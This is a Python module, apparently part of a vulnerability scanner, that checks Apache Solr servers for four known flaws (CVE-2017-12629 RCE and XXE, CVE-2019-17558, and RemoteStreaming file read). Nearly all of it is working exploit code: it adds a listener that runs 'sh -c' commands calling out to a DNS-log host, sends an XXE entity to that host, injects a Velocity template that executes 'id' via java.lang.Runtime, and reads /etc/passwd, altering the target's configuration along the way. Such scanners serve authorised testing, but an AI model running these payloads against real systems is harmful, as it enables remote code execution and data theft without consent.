import json
import logging
import random
import re
import string
from urllib.parse import urljoin

import requests

from lib.connection.HttpEntity import Request
from lib.help.dnslog import DNS_LOG
from lib.help.dump import vul, Rank


def generate_random_string(length):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(length))


class Solr:
    def __init__(self, url):
        self.dns_log = None
        self.url = url + '/'
        self.config = {
            "update-queryresponsewriter": {
                "startup": "lazy",
                "name": "velocity",
                "class": "solr.VelocityResponseWriter",
                "template.base.dir": "",
                "solr.resource.loader.enabled": "true",
                "params.resource.loader.enabled": "true"
            }
        }
        self.velocity_template = '?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set(' \
                                 '$rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(' \
                                 '%27java.lang.Character%27))+%23set($str=$x.class.forName(' \
                                 '%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor(' \
                                 ')+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available(' \
                                 ')])$str.valueOf($chr.toChars($out.read()))%23end'
        self.remote_enable = {
            'set-property': {
                'requestDispatcher.requestParsers.enableRemoteStreaming': True,
            },
        }
        self.id_pattern = re.compile("uid.*?gid.*?groups.*?")
        self.pwd_pattern = re.compile("root.*?root:/root:/")

    def update_dns(self):
        self.dns_log = DNS_LOG()

    def check_rce1(self):
        self.update_dns()
        for cmd in self.dns_log.takeout_cmd:
            data = {"add-listener": {
                "event": "postCommit",
                "name": generate_random_string(6),
                "class": "solr.RunExecutableListener",
                "exe": "sh", "dir": "/bin/", "args": ["-c", cmd]
            }}
            logging.info("[+] testing :" + cmd)
            while True:
                try:  # 奇怪的错误, 第一个包发不出去
                    Request('POST', urljoin(self.url, '/config'), json_flag=True, data=data, timeout=3).send()
                    break
                except requests.exceptions.Timeout:
                    pass
            for i in range(5):
                Request('POST', urljoin(self.url, '/update'), json_flag=True, data='[{"id":"test"}]').send()
            if record := self.dns_log.check_log():
                logging.warning("[+] Apache Solr RCE vulnerable (CVE-2017-12629)")
                logging.warning("[+] DNS log: " + str(record))
                return vul("RCE", "detail: https://vulhub.org/#/environments/solr/CVE-2017-12629-RCE/",
                           "Apache Solr RCE CVE-2017-12629; DNS log: " + str(record), Rank.CRITICAL)

    def check_xxe(self):
        self.update_dns()
        params = {
            'q': f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://{self.dns_log.domain}">%remote;]><root/>',
            'wt': 'xml',
            'defType': 'xmlparser'
        }
        Request('GET', urljoin(self.url, 'demo/select'), data=params).send()
        if record := self.dns_log.check_log():
            logging.warning("[+] Apache Solr XXE vulnerable (CVE-2017-12629)")
            logging.warning("[+] DNS log: " + str(record))
            return vul("XXE", "detail: https://vulhub.org/#/environments/solr/CVE-2017-12629-XXE/",
                       "Apache Solr XXE CVE-2017-12629; DNS log: " + str(record), Rank.CRITICAL)

    def check_rce2(self):
        try:
            r = Request('GET', urljoin(self.url, '/solr/admin/cores?indexInfo=false&wt=json')).send().res.json()
            for key in r['status']:
                Request('POST', urljoin(self.url, f'/solr/{key}/config'), data=self.config,
                        json_flag=True).send()
                res = Request('GET', urljoin(self.url, f'/solr/{key}/select') + self.velocity_template).send().body
                if match := self.id_pattern.search(res):
                    logging.warning("[+] Apache Solr RCE (CVE-2019-17558)")
                    logging.warning("[+] detected id echo :" + match.group())
                    return vul("RCE", "detail: https://vulhub.org/#/environments/solr/CVE-2019-17558/",
                               "Apache Solr RCE CVE-2019-17558; id echo: " + match.group(), Rank.CRITICAL)
        except requests.exceptions.JSONDecodeError or KeyError:
            pass

    def check_ssrf(self):
        try:
            r = Request('GET', urljoin(self.url, '/solr/admin/cores?indexInfo=false&wt=json')).send().res.json()
            for key in r['status']:
                Request('POST', urljoin(self.url, f'/solr/{key}/config'), data=self.remote_enable,
                        json_flag=True).send()
                res = Request('GET', urljoin(self.url,
                                             f'/solr/{key}/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd')).send().body
                if self.pwd_pattern.search(res):
                    logging.warning("[+] Apache Solr RemoteStreaming Arbitrary File Reading and SSRF")
                    logging.warning("[+] dumping /etc/passwd: \n" + json.loads(res)['streams'][0]['stream'])
                    return vul("SSRF", "detail: https://vulhub.org/#/environments/solr/Remote-Streaming-Fileread/",
                               "Apache Solr RemoteStreaming Arbitrary File Reading and SSRF; dumping /etc/passwd: " +
                               json.loads(res)['streams'][0]['stream'], Rank.CRITICAL)
        except requests.exceptions.JSONDecodeError or KeyError:
            pass

    def solr_check(self):
        methods = [(method[6:], getattr(self, method)) for method in dir(self) if
                   callable(getattr(self, method)) and method.startswith("check")]
        solr_vul = []
        for meth in methods:
            if res := meth[1]():
                solr_vul.append(res)
        return solr_vul
